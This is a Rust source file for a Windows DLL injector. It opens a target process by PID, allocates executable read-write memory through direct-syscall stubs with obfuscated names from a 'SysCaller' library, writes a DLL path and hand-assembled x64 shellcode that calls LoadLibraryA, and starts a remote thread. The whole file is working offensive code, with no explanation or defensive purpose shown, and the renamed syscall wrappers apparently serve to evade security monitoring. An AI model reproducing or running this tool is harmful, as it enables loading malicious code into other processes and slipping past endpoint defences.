use std::env;
use std::ffi::{CString, c_void};
use std::ptr::null_mut;
use windows::Win32::Foundation::{HANDLE, NTSTATUS, CloseHandle};
use windows::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
use windows::Win32::System::Threading::{OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE};
use windows::core::{PCSTR, PCWSTR};

type SIZE_T = usize;
type ULONG = u32;

#[link(name = "SysCaller")]
extern "system" {
    fn oznbvo_655212(
        process_handle: HANDLE,
        base_address: *mut *mut c_void,
        region_size: *mut SIZE_T,
        allocation_type: ULONG,
        protect: ULONG,
        extended_params: *mut c_void,
        param_count: ULONG,
    ) -> NTSTATUS;

    fn yexedj_555900(
        process_handle: HANDLE,
        base_address: *mut c_void,
        buffer: *mut c_void,
        buffer_size: SIZE_T,
        bytes_written: *mut SIZE_T,
    ) -> NTSTATUS;

    fn jljtug_682236(
        thread_handle: *mut HANDLE,
        desired_access: ULONG,
        object_attributes: *mut c_void,
        process_handle: HANDLE,
        start_routine: *mut c_void,
        argument: *mut c_void,
        create_flags: ULONG,
        zero_bits: SIZE_T,
        stack_size: SIZE_T,
        max_stack_size: SIZE_T,
        attribute_list: *mut c_void,
    ) -> NTSTATUS;

    fn ezhgwv_592746(handle: HANDLE) -> NTSTATUS;
}

fn nt_success(status: NTSTATUS) -> bool {
    status.0 as i32 >= 0
}

fn InjectDLL(process_handle: HANDLE, dll_path: &str) -> bool {
    unsafe {
        // DLL path as null-terminated ASCII
        let abs_path = std::fs::canonicalize(dll_path).unwrap();
        let abs_path_str = abs_path.to_str().unwrap();
        let dll_path_bytes = CString::new(abs_path_str).unwrap();
        let path_size = dll_path_bytes.as_bytes_with_nul().len();
        // Allocate memory for DLL path
        let mut base_address: *mut c_void = null_mut();
        let mut region_size: SIZE_T = path_size;
        let status = oznbvo_655212(
            process_handle,
            &mut base_address,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
            null_mut(),
            0,
        );
        if !nt_success(status) {
            println!("[!] Failed to allocate memory for DLL path. Status: 0x{:08X}", status.0);
            return false;
        }
        println!("[+] Allocated DLL path memory at: 0x{:016X}", base_address as usize);
        // Write DLL path
        let mut bytes_written: SIZE_T = 0;
        let status = yexedj_555900(
            process_handle,
            base_address,
            dll_path_bytes.as_ptr() as *mut c_void,
            path_size,
            &mut bytes_written,
        );
        if !nt_success(status) || bytes_written != path_size {
            println!("[!] Failed to write DLL path. Status: 0x{:08X}, Bytes written: {}", status.0, bytes_written);
            return false;
        }
        println!("[+] Successfully wrote DLL path to memory");
        // Get LoadLibraryA address
        let k32w: Vec<u16> = "kernel32.dll".encode_utf16().chain(Some(0)).collect();
        let h_kernel32 = GetModuleHandleW(PCWSTR(k32w.as_ptr()));
        if h_kernel32.is_err() {
            println!("[!] Failed to get kernel32.dll handle");
            return false;
        }
        let h_kernel32 = h_kernel32.unwrap();
        let load_library = GetProcAddress(h_kernel32, PCSTR(b"LoadLibraryA\0".as_ptr()));
        if load_library.is_none() {
            println!("[!] Failed to get LoadLibraryA address");
            return false;
        }
        let load_library = load_library.unwrap() as *const c_void as usize;
        println!("[+] LoadLibraryA address: 0x{:016X}", load_library);
        // Build x64 shellcode
        let mut shellcode = vec![
            0x48, 0x83, 0xEC, 0x28,             // sub rsp, 0x28
            0x48, 0xB9,                         // mov rcx,
        ];
        shellcode.extend_from_slice(&(base_address as u64).to_le_bytes());
        shellcode.extend_from_slice(&[0x48, 0xB8]); // mov rax,
        shellcode.extend_from_slice(&(load_library as u64).to_le_bytes());
        shellcode.extend_from_slice(&[
            0xFF, 0xD0,                         // call rax
            0x48, 0x83, 0xC4, 0x28,             // add rsp, 0x28
            0xC3                                // ret
        ]);
        let shellcode_size = shellcode.len();
        // Allocate memory for shellcode
        let mut shellcode_addr: *mut c_void = null_mut();
        let mut region_size: SIZE_T = shellcode_size;
        let status = oznbvo_655212(
            process_handle,
            &mut shellcode_addr,
            &mut region_size,
            0x3000,
            0x40,
            null_mut(),
            0,
        );
        if !nt_success(status) {
            println!("[!] Failed to allocate memory for shellcode. Status: 0x{:08X}", status.0);
            return false;
        }
        println!("[+] Allocated shellcode memory at: 0x{:016X}", shellcode_addr as usize);
        // Write shellcode
        let mut bytes_written: SIZE_T = 0;
        let status = yexedj_555900(
            process_handle,
            shellcode_addr,
            shellcode.as_ptr() as *mut c_void,
            shellcode_size,
            &mut bytes_written,
        );
        if !nt_success(status) || bytes_written != shellcode_size {
            println!("[!] Failed to write shellcode. Status: 0x{:08X}, Bytes written: {}", status.0, bytes_written);
            return false;
        }
        println!("[+] Successfully wrote shellcode");
        // Create remote thread
        let mut thread_handle: HANDLE = HANDLE(0);
        let status = jljtug_682236(
            &mut thread_handle,
            0x1FFFFF, // THREAD_ALL_ACCESS
            null_mut(),
            process_handle,
            shellcode_addr,
            null_mut(),
            0, 0, 0, 0,
            null_mut(),
        );
        if !nt_success(status) || thread_handle.0 == 0 {
            println!("[!] Failed to create remote thread. Status: 0x{:08X}, Handle: 0x{:016X}", status.0, thread_handle.0 as usize);
            return false;
        }
        println!("[+] Created remote thread: 0x{:016X}", thread_handle.0 as usize);
        // Wait for thread and close handle
        WaitForSingleObject(thread_handle, 5000);
        ezhgwv_592746(thread_handle);
        println!("[+] Successfully injected {}!", dll_path);
        true
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 3 {
        println!("Usage: {} <pid> <dll_path>", args[0]);
        return;
    }
    let pid: u32 = args[1].parse().unwrap();
    let dll_path = &args[2];
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if process_handle.is_err() {
            println!("[!] Failed to open process {}", pid);
            return;
        }
        let process_handle = process_handle.unwrap();
        InjectDLL(process_handle, dll_path);
        CloseHandle(process_handle);
    }
}
